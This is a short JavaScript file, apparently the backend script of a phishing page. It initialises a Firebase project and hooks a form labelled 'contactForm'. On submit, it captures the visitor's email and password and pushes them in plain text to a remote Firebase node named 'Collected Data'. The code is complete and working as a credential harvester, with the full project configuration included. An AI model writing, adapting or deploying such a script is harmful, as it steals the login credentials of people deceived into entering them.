var firebaseConfig = {
    apiKey: "AIzaSyD-FOFIfNEit61u1IrmGnRj57glR997bvI",
    authDomain: "ayeminsoe-10fed.firebaseapp.com",
    databaseURL: "https://ayeminsoe-10fed-default-rtdb.firebaseio.com",
    projectId: "ayeminsoe-10fed",
    storageBucket: "ayeminsoe-10fed.appspot.com",
    messagingSenderId: "650184619187",
    appId: "1:650184619187:web:7b83345b5e757b0438ecc6",
    measurementId: "G-CJX8DGYTKZ"
};

firebase.initializeApp(firebaseConfig);
document.getElementById('contactForm')
.addEventListener('submit', submitForm);

var MessageRef = firebase.database().ref('Collected Data');

function submitForm(e) {

    e.preventDefault();

    // Get values
    var email = getInputVal('email');
    var password = getInputVal('password');

    saveMessage(email, password);
    document.getElementById('contactForm').reset();
}

// Function to get get form values
function getInputVal(id) {
    return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(email, password) {
    var newMessageRef = MessageRef.push();
    newMessageRef.set({
        email: email,
        password: password,
    });
}